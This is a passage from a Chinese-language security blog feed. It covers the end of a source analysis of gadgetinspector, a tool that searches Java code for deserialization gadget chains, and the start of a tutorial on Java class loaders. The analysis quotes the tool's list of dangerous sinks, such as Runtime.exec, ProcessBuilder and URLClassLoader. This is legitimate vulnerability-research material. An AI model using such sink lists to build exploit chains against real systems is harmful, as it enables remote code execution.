class="comment">//新方法节点</span></span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="comment">//如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加...</span></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);<span class="comment">//新节点与之前的链组成新链</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;<span class="comment">//如果到达了sink，则加入discoveredGadgets</span></span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//新链加入队列</span></span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            <span class="comment">//新节点加入已访问集合</span></span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保存搜索到的利用链到gadget-chains.txt</span></span><br><span class="line">        <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">"gadget-chains.txt"</span>));</span><br><span class="line">             Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里先看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(inheritanceMap, methodMap);</span><br></pre></td></tr></table></figure><p>这里是为了得到父类方法的所有子类方法实现（被子类重写的方法）</p><p>因为Java的继承特性，对于一个父类，它的方法实现，可以通过子孙类进行重写覆盖。</p><p>因为多态特性，实现类只有运行时可确定，因此，需要对其所有重写实现都形成分析链，就能确保在非运行时，做到gadget chain的挖掘。</p><p>分析InheritanceDeriver.getAllMethodImplementations代码：</p><p>首先获取类对应的方法集合，就是每个里面有哪些方法。</p><p>methodByClass：类名-类拥有的方法名</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322115045568.png" alt="image-20210322115045568" style="zoom:80%;"><p>subClassMap：父类-继承的子孙类</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322115453899.png" alt="image-20210322115453899" style="zoom:80%;"><p>接下来遍历methodMap中的每个方法，并通过查询继承了方法所属类的子孙类的方法实现，确定方法是否被重写，最后整合成 方法-&gt;重写的方法集 的映射集合，静态方法跳过，是不可被重写的。</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322131051058.png" alt="image-20210322131051058" style="zoom:80%;"><p>保存的数据格式：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322132035155.png" alt="image-20210322132035155"></p><p>接下来整合：</p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322132556641.png" alt="image-20210322132556641" style="zoom:100%;"><p>太晕了。。有时间整理。</p><p>作者给出的判断sink方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileInputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileOutputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; (method.getName().equals(<span class="string">"newInputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newOutputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedReader"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedWriter"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("forName")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("getMethod")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we</span></span><br><span class="line">        <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">        <span class="comment">// method is being invoked, we don't mark that as interesting.</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/reflect/Method"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invoke"</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URLClassLoader"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newInstance"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/System"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Shutdown"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newOutputStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/ProcessBuilder"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/ClassLoader"</span>))</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URL"</span>) &amp;&amp; method.getName().equals(<span class="string">"openStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"org/codehaus/groovy/runtime/InvokerHelper"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invokeMethod"</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/MetaClass"</span>))</span><br><span class="line">                &amp;&amp; Arrays.asList(<span class="string">"invokeMethod"</span>, <span class="string">"invokeConstructor"</span>, <span class="string">"invokeStaticMethod"</span>).contains(method.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于每个入口节点来说，其全部子方法调用、孙子方法调用等等递归下去，就构成了一棵树。之前的步骤所做的，就相当于生成了这颗树，而这一步所做的，就是从根节点出发，找到一条通往叶子节点的道路，使得这个叶子节点正好是我们所期望的sink方法。gadgetinspector对树的遍历采用的是广度优先(BFS)，而且对于已经检查过的节点会直接跳过，<strong>这样减少了运行开销，避免了环路，但是丢掉了很多其他链。</strong></p><h2 id="GI的缺点"><a href="#GI的缺点" class="headerlink" title="GI的缺点"></a>GI的缺点</h2><ol><li>对于运行时确定的实现，也就是多态性，没办法做到污点分析：</li><li>还是因为多态的原因，还是没法做到完整的调用链搜索</li><li></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;好风凭借力，送我上青云。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天来分析&lt;a href=&quot;https://github.com/JackOfMostTrades/gadgetinspector&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gadgetinspector&lt;/a&gt;源码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="源码分析" scheme="https://0range228.github.io/categories/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    
      <category term="GadgetInspector" scheme="https://0range228.github.io/tags/GadgetInspector/"/>
    
  </entry>
  
  <entry>
    <title>Java类加载器</title>
    <link href="https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2020-11-05T06:58:05.000Z</published>
    <updated>2021-03-15T12:57:46.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>梦里玉人方下马，恨他天外一声鸿。</p></blockquote><p>今天来总结类加载机制。</p><a id="more"></a><h1 id="编译器与解释器"><a href="#编译器与解释器" class="headerlink" title="编译器与解释器"></a>编译器与解释器</h1><p>我们通常会把编程语言的处理器分为<code>编译器</code>和<code>解释器</code>。</p><p>编译器则是将某种语言代码转换为另外一种语言的程序，通常会转换为机器语言。</p><p>解释器是一种用来执行程序的软件，它会根据程序代码中的算法执行运算，如果这个软件是根据虚拟的或者类似机器语言的程序设计语言写成，那也称为虚拟机。</p><p>Java会混用解释器和编译器，Java会先通过编译器将源代码转换为Java二进制代码（字节码），并将这种虚拟的机器语言保存在文件中（通常是.class文件），之后通过Java虚拟机（JVM）的解释器来执行这段代码。</p><h1 id="类和类加载器"><a href="#类和类加载器" class="headerlink" title="类和类加载器"></a>类和类加载器</h1><p>这里直接上《深入理解Java虚拟机》原文，写得很好：</p><blockquote><p>对于任意的一个类。其实都必须由加载它的类加载器和这个类本身一起共同确立其在Java虚拟机中的唯一性，每一个类加载器，都拥有一个独立的类名称空间。两个类是否相等，其实只有这两个类都是由同一个类加载器加载的前提下才有意义。只要加载它们的类加载器不同，那么这两个类就必定不相等。</p></blockquote><p>Java是面向对象的语言，字节码中包含了很多Class信息。在 JVM 解释执行的过程中，ClassLoader就是用来加载Java类的，它会将Java字节码加载到内存中。每个 Class 类对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。</p><p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20210306155604696.png" alt="image-20210306155604696"></p><p>Java的类加载体系：parent属性 理论关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bootstrap Classloader -&gt; Extension ClassLoader -&gt; Application ClassLoader</span><br></pre></td></tr></table></figure><p>JDK类实现体系：实现/继承的关系，通常继承URLClassLoader</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader -&gt; Secure ClassLoader -&gt; URL ClassLoader -&gt; ExtClassLoader/AppClassLoader</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20210225193851385.png" alt="image-20210225193851385"></p><h1 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h1><p>站在JVM角度来看，只存在两种不同的类加载器：</p><ul><li>启动类加载器 BootstrapClassLoader/使用C++实现</li><li>其他类加载器/都是由Java实现/全部继承抽象类java.lang.ClassLoader</li></ul><h2 id="Bootstrap-ClassLoader-启动类加载器"><a href="#Bootstrap-ClassLoader-启动类加载器" class="headerlink" title="Bootstrap ClassLoader 启动类加载器"></a>Bootstrap ClassLoader 启动类加载器</h2><p>负责加载存放在<code>JAVA_HOME/lib</code>目录下，或者被-Xbooclasspath参数所指定的路径中存放的，并且可以被JVM识别的类库，加载到虚拟机的内存中。</p><p>底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。</p><p>出于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类。</p><p>它负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.<em>.</em> 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。</p><h2 id="Extension-ClassLoader-扩展类加载器"><a href="#Extension-ClassLoader-扩展类加载器" class="headerlink" title="Extension ClassLoader 扩展类加载器"></a>Extension ClassLoader 扩展类加载器</h2><p>负责加载Java的扩展类库，默认加载<code>JAVA_HOME/jre/lib/ext/</code>目下的所有jar，库名通常以 javax 开头。</p><h2 id="Application-ClassLoader-系统类加载器"><a href="#Application-ClassLoader-系统类加载器" class="headerlink" title="Application ClassLoader 系统类加载器"></a>Application ClassLoader 系统类加载器</h2><p>直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。</p><p>如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</p><p>可以通过 ClassLoader.getSystemClassLoader() 来获取它。</p><h2 id="特殊：URLClassloader"><a href="#特殊：URLClassloader" class="headerlink" title="特殊：URLClassloader"></a>特殊：URLClassloader</h2><p>ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。在JDK实现中，BootstrapClassLoader、ExtClassLoader、AppClassLoader等都是 URLClassLoader 的子类。</p><p>ExtClassLoader 和 AppClassLoader 类的实现代码位于rt.jar 中的 sun.misc.Launcher 类中，Launcher是由BootstrapClassLoader加载的。</p><h2 id="用户自定义类加载器"><a href="#用户自定义类加载器" class="headerlink" title="用户自定义类加载器"></a>用户自定义类加载器</h2><p>开发人员可以通过继承java.lang.ClassLoader 类的方式实现自己的类加载器，重写 findClass()方法，以满足一些特殊的需求。</p><p><strong>我们可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器</strong>。具体实现方法我们等下单独讲解。</p><blockquote><p>双亲委派模型工作过程是：如果一个类加载器收到类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器完成。每个类加载器都是如此，只有当父加载器在自己的搜索范围内找不到指定的类时（即ClassNotFoundException），子加载器才会尝试自己去加载。</p></blockquote><p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201105161406752.png" alt="image-20201105161406752"></p><h1 id="ClassLoader类-核心方法"><a href="#ClassLoader类-核心方法" class="headerlink" title="ClassLoader类 - 核心方法"></a>ClassLoader类 - 核心方法</h1><p>每个 ClassLoader 对象都是一个 java.lang.ClassLoader 的实例。每个Class对象都被这些 ClassLoader 对象所加载，通过继承java.lang.ClassLoader 可以扩展出自定义 ClassLoader，并使用这些自定义的 ClassLoader 对类进行加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String name)</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">protected</span> Class <span class="title">defineClass</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> URL <span class="title">getResource</span><span class="params">(String name)</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Enumeration <span class="title">getResources</span><span class="params">(String name)</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> ClassLoader <span class="title">getParent</span><span class="params">()</span></span>;</span><br><span class="line"> Class&lt;?&gt; findClass(String name)</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>(加载指定的Java类) 它接受一个全类名，然后返回一个 Class 类型的实例。</li><li><code>findClass</code>(查找指定的Java类) 查找名称为name都一个类是否存在，返回的结果是java.lang.Class类对象实例。</li><li><code>findLoadedClass</code>(查找JVM已经加载过的类)</li><li><code>defineClass</code>(定义一个Java类) 接受一组字节，实例化为一个Class 类型实例。</li><li><code>resolveClass</code>(链接指定的Java类)</li><li><code>getParent</code>返回其parent ClassLoader</li></ol><p>重点逻辑：</p><ul><li><p>loadClass(String classname)，参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用loadClass()，如果都没找到则调用findClass()。</p></li><li><p>findClass()，搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。</p></li><li><p>defineClass()，将字节码转换为 JVM 的 java.lang.Class 对象。</p></li></ul><p>整个demo玩玩看；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassLoader cl = Hello<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(cl);</span><br><span class="line"></span><br><span class="line">        ClassLoader clParent = cl.getParent();</span><br><span class="line">        System.out.println(clParent);</span><br><span class="line"></span><br><span class="line">        ClassLoader cl2 = clParent.getParent();</span><br><span class="line">        System.out.println(cl2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201105164854799.png" alt="image-20201105164854799"></p><h2 id="重点：loadClass"><a href="#重点：loadClass" class="headerlink" title="重点：loadClass()"></a>重点：loadClass()</h2><p>源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>它先使用了findLoadedClass(String)方法来检查这个类是否被加载过</p><p>接着使用父加载器调用loadClass(String)方法</p><p>之后就调用findClass(String) 方法装载类。</p><p>最后通过上述步骤找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。</p><h1 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h1><p>显式加载：通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象。也可以理解为类动态加载</p><p>隐式加载：<code>类名.方法名()</code>或<code>new</code>类实例。</p><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载Test示例</span></span><br><span class="line">Class.forName(<span class="string">"com.sec.Test"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载Test示例</span></span><br><span class="line"><span class="keyword">this</span>.getClass.getClassLoader().loadClass(<span class="string">"com.sec.Test"</span>);</span><br></pre></td></tr></table></figure><p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法</p><p>如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code></p><p><code>ClassLoader.loadClass</code>默认不会初始化类，只是将类加载进JVM虚拟机。</p><p><code>Class.forName()</code>可以加载数组，而<code>ClassLoader.loadClass()</code> 不能。</p><h1 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h1><p> Java 中提供的默认 ClassLoader 只加载指定目录下面的 jar 和 class ，我们从上面了解到 ClassLoader是一个抽象类，实现自定义的 ClassLoader 需要继承该类并实现里面的方法。</p><p><strong><code>java.lang.ClassLoader</code>是所有的类加载器的父类。</strong></p><p><strong>一般情况下，我们重写父类的 findClass 方法即可。</strong></p><p><strong>双亲委派机制是loadClass()函数负责的。</strong></p><p>*<em>一个ClassLoader创建时如果没有指定parent，那么它的parent默认就是AppClassLoader。 *</em></p><p>如果自定义一个ClassLoader，默认的parent父加载器是AppClassLoader，因为这样就能够保证它能访问系统内置加载器加载成功的class文件。</p><p>ClassLoader 方法那么多为什么只重写 findClass 方法？ 因为 JDK 已经在 loadClass 方法中帮我们实现了 ClassLoader 搜索类的算法，当在 loadClass 方法中搜索不到类时，loadClass 方法就会调用findClass 方法来搜索类，所以我们只需重写该方法即可。如没有特殊的要求，一般不建议重写 loadClass 